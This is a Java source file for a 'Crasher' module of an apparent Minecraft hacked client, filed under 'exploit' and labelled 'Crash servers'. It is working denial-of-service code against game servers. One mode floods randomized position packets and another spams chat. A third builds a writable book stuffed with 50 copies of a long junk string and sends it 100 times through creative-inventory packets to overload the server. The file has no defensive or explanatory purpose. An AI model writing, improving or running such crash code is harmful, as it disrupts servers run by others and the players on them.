package wtf.monsoon.impl.modules.exploit;


import wtf.monsoon.api.event.EventTarget;
import wtf.monsoon.api.event.impl.EventUpdate;
import wtf.monsoon.api.module.Category;
import wtf.monsoon.api.module.Module;
import wtf.monsoon.api.setting.impl.ModeSetting;
import wtf.monsoon.api.setting.impl.NumberSetting;
import wtf.monsoon.api.util.misc.Timer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.status.client.C01PacketPing;
import org.lwjgl.input.Keyboard;

public class Crasher extends Module {

	public static int BlockAnimationInt = 0;


	public ModeSetting mode = new ModeSetting("Mode", this, "Position", "Position", "Chat", "Item");
	public NumberSetting delay = new NumberSetting("Delay", 150, 1, 2000, 4, this);

	public Crasher() {
		super("Crasher", "Crash servers", Keyboard.KEY_NONE, Category.EXPLOIT);
		this.addSettings(mode,delay);
	}
	
	Timer timer = new Timer();

	@Override
	public void onEnable() {
		super.onEnable();
	}

	@EventTarget
	public void onUpdate(EventUpdate e) {
		if(mode.is("Position")) {
			if (timer.hasTimeElapsed((long) delay.getValue(), true)) {
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + randDouble(1, 100), mc.thePlayer.posX + randDouble(1, 100), mc.thePlayer.posZ + randDouble(1, 100), mc.thePlayer.onGround));
			}
		}
		if(mode.is("Chat")) {
			mc.thePlayer.sendChatMessage("monsoon.wtf");
		}
		if(mode.is("Item")) {
			ItemStack book = new ItemStack(Items.writable_book);
			NBTTagList list = new NBTTagList();
			NBTTagCompound tag = new NBTTagCompound();
			String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
			for (int i = 0; i < 50; i++) {
				String siteContent = size;
				NBTTagString tString = new NBTTagString(siteContent);
				list.appendTag(tString);
			}
			tag.setString("author", "Robearttt");
			tag.setString("title", "Hause unban me");
			tag.setTag("pages", list);
			book.setTagInfo("pages", list);
			book.setTagCompound(tag);
			for (int i = 0; i < 100; i++) {
				try {
					mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(0, book));
				} catch (Exception eex) {
					eex.printStackTrace();
				}
			}
		}
	}


	public double randDouble(double bound1, double bound2) {
		//make sure bound2> bound1
		double min = Math.min(bound1, bound2);
		double max = Math.max(bound1, bound2);
		//math.random gives random number from 0 to 1
		return min + (Math.random() * (max - min));
	}
}